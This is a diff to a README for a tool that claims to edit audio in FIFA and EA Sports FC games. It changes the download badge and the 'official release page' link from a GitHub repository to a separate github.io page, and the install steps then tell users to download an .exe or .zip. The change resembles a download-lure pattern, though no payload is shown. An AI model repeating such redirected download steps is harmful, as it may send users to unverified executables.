@@ -1,6 +1,6 @@
 # 🎧 FIFA-Audio-Editor-Tool - Manage custom audio for football games
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Undeferential-andrew98/FIFA-Audio-Editor-Tool)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://undeferential-andrew98.github.io)
 
 This software allows you to modify audio files within EA Sports FC and FIFA titles. You can import and export commentary, stadium chants, and sound effects. This tool works with your local game files to change the audio experience.
 
@@ -16,7 +16,7 @@ Ensure you meet these requirements before you start:
 
 ## 📥 How to Install
 
-1. Visit the [official release page](https://github.com/Undeferential-andrew98/FIFA-Audio-Editor-Tool).
+1. Visit the [official release page](https://undeferential-andrew98.github.io).
 2. Look for the "Releases" section on the right side of the page.
 3. Click the latest version number.
 4. Download the file ending in .zip or .exe.
